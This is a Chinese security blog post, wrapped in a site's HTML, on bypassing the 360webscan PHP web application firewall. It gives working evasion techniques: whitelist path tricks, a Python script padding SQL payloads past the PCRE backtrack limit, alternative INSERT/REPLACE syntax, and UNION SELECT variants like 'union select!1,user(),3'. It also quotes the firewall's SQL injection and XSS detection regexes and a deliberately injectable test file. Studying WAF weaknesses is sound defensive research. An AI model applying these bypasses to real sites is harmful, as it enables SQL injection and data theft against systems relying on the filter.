@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.0">
+<meta name="google-site-verification" content="DPsEF01SMytD4bnWQ221G1mMmGqFRfanBwmVZh7ACaU" />
+<meta name="baidu-site-verification" content="9w2JQKMeTC" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://h3art3ars.github.io').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="绕过360webscan通防的方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="360webscan bypass">
+<meta property="og:url" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;2020&#x2F;02&#x2F;17&#x2F;360webscan-bypass&#x2F;index.html">
+<meta property="og:site_name" content="h3art3ars">
+<meta property="og:description" content="绕过360webscan通防的方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan12.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan10.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan11.png">
+<meta property="article:published_time" content="2020-02-17T05:39:48.000Z">
+<meta property="article:modified_time" content="2020-02-17T05:46:53.491Z">
+<meta property="article:author" content="h3art3ars">
+<meta property="article:tag" content="waf">
+<meta property="article:tag" content="bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;360webscan1.png">
+
+<link rel="canonical" href="http://h3art3ars.github.io/2020/02/17/360webscan-bypass/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>360webscan bypass | h3art3ars</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="h3art3ars" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+	
+	<script type="text/javascript"
+		color="51,204,204 " opacity='0.5' zIndex="-2" count="120" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+	
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h3art3ars</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">路漫漫其修远兮，吾将上下而求索</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://h3art3ars.github.io/2020/02/17/360webscan-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="h3art3ars">
+      <meta itemprop="description" content="笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h3art3ars">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          360webscan bypass
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-17 13:39:48 / 修改时间：13:46:53" itemprop="dateCreated datePublished" datetime="2020-02-17T13:39:48+08:00">2020-02-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/waf/" itemprop="url" rel="index">
+                    <span itemprop="name">waf</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">绕过360webscan通防的方法</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>将360safe文件夹放入网站根目录，在入口文件或者需要过滤的文件使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">	require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if(is_file($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">	require_once($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;&#x2F;360safe&#x2F;360webscan.php&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select *  from tab where id &#x3D;&quot;.$_POST[&#39;id&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">echo $sql;</span></pre></td></tr></table></figure>
+
+
+
+<h2 id="php-self白名单绕过"><a href="#php-self白名单绕过" class="headerlink" title="php_self白名单绕过"></a>php_self白名单绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_directory&#x3D;&#39;admin|\&#x2F;dede\&#x2F;|\&#x2F;install\&#x2F;&#39;;</span></pre></td></tr></table></figure>
+
+<p><code>php_self</code>中含有 <code>admin</code>或者 <code>/dede/</code> 或者 <code>/install/</code>时，不过滤字符</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>传参 <code>id=select * from aaa</code>拦截</p>
+<p><img src="/images/360webscan1.png" alt=""></p>
+<p>在urlpath之后添加 <code>/admin</code> ,<code>/dede/</code> ,<code>/install/</code>之后不拦截</p>
+<p><img src="/images/360webscan2.png" alt=""></p>
+<h2 id="white-url白名单绕过"><a href="#white-url白名单绕过" class="headerlink" title="white_url白名单绕过"></a>white_url白名单绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$webscan_white_url &#x3D; array(&#39;index.php&#39; &#x3D;&gt; &#39;m&#x3D;admin&#39;,&#39;post.php&#39; &#x3D;&gt; &#39;job&#x3D;postnew&amp;step&#x3D;post&#39;,&#39;edit_space_info.php&#39;&#x3D;&gt;&#39;&#39;);</span></pre></td></tr></table></figure>
+
+<p><code>index.php?m=admin</code>, <code>post.php?job=postnew&amp;step=post</code>  , <code>edit_apace_info.php</code>不过滤</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/images/360webscan3.png" alt=""></p>
+<p><img src="/images/360webscan5.png" alt=""></p>
+<p><img src="/images/360webscan6.png" alt=""></p>
+<p>这两个白名单的方法很容易会被使用的人给更改掉</p>
+<h2 id="超长字符串绕过正则"><a href="#超长字符串绕过正则" class="headerlink" title="超长字符串绕过正则"></a>超长字符串绕过正则</h2><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;get拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$getfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|^\\+\\&#x2F;v(8|9)|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;post拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$postfilter &#x3D; &quot;\\b(alert\\(|confirm\\(|prompt\\()\\b|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^&gt;]*?&gt;|\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie拦截规则</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$cookiefilter &#x3D; &quot;\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr></table></figure>
+
+<p>是正则表达式设置规则，因此可利用<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">def exp():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    domain &#x3D; &#39;http:&#x2F;&#x2F;debug.com&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    path &#x3D; &#39;&#x2F;test.php&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain + path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    headers &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    # payload &#x3D; &quot;select *&#x2F;*&quot;+&#39;a&#39;*1000000+&#39;*&#x2F; from aaa&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &quot;select * from aaa&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;&quot;id&quot;: payload&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain+path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(url&#x3D;url, data&#x3D;data, headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    if &#39;webscan&#39;in res.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        print(&quot;fobidden!\n&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    print(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    exp()</span></pre></td></tr></table></figure>
+
+<p>当直接传参时候,显示拦截了</p>
+<p><img src="/images/360webscan7.png" alt=""></p>
+<p>当填充<code>payload</code>即<code>id</code>参数中1000000个a时</p>
+<p><img src="/images/360webscan8.png" alt=""></p>
+<h2 id="插入绕过正则"><a href="#插入绕过正则" class="headerlink" title="插入绕过正则"></a>插入绕过正则</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">INSERT\\s+INTO.+?VALUES</span></pre></td></tr></table></figure>
+
+<p>insert 数据可以用另几种方式</p>
+<ol>
+<li><code>insert into table set name = &#39;admin&#39;,pass = &#39;123456&#39;</code></li>
+<li><code>insert table(name,password) values(&#39;admin&#39;,&#39;123456&#39;)</code></li>
+<li><code>insert into table(name,password) select &#39;admin&#39;,&#39;123456&#39;</code></li>
+</ol>
+<p>这几种写法可以随意组合着用</p>
+<p>可用性测试：</p>
+<p><img src="/images/360webscan12.png" alt=""></p>
+<p>绕过测试</p>
+<p><img src="/images/360webscan9.png" alt=""></p>
+<p><img src="/images/360webscan10.png" alt=""></p>
+<p><img src="/images/360webscan11.png" alt=""></p>
+<p>另外，还可以用 <code>replace into</code>来代替<code>insert</code>与<code>update</code>，而且<code>replace into</code>也有和<code>insert into</code>一样的三种写法加上一种普通写法都可以绕过。</p>
+<h2 id="老版本绕过"><a href="#老版本绕过" class="headerlink" title="老版本绕过"></a>老版本绕过</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p> WEBSCAN_VERSION：0.1.3.2 </p>
+<p>先在使用了360通防的页面上发送<code>?id=union select ’1,2,3&#39;</code>若是拦截，再发送<code>id = union select!1,2,3</code>不拦截，则可以union绕过。</p>
+<p>可使用</p>
+<ol>
+<li><code>union select!1,user(),3</code></li>
+<li><code>union select@1,user(),3</code></li>
+</ol>
+<p>若是数据库编码不是utf-8则可以使用%a0隔绝select与from造成绕过。（编码问题不懂）</p>
+<p><code>select%a0*%a0from%20tables</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/waf/" rel="tag"># waf</a>
+              <a href="/tags/bypass/" rel="tag"># bypass</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" rel="prev" title="xyhcms漏洞整理">
+      <i class="fa fa-chevron-left"></i> xyhcms漏洞整理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#使用"><span class="nav-number">1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试代码"><span class="nav-number">2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-self白名单绕过"><span class="nav-number">3.</span> <span class="nav-text">php_self白名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">3.2.</span> <span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#white-url白名单绕过"><span class="nav-number">4.</span> <span class="nav-text">white_url白名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-1"><span class="nav-number">4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实例"><span class="nav-number">4.2.</span> <span class="nav-text">实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#超长字符串绕过正则"><span class="nav-number">5.</span> <span class="nav-text">超长字符串绕过正则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-2"><span class="nav-number">6.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试-1"><span class="nav-number">6.1.</span> <span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#插入绕过正则"><span class="nav-number">7.</span> <span class="nav-text">插入绕过正则</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理-3"><span class="nav-number">7.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#老版本绕过"><span class="nav-number">8.</span> <span class="nav-text">老版本绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测"><span class="nav-number">8.1.</span> <span class="nav-text">检测</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="h3art3ars"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">h3art3ars</p>
+  <div class="site-description" itemprop="description">笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/h3art3ars" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;h3art3ars" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:570498521aeth@gmail.com" title="E-Mail → mailto:570498521aeth@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h3art3ars</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+	
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
